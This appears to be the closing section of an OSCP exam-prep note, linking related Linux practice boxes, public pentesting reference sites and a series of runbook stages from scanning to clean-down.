- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
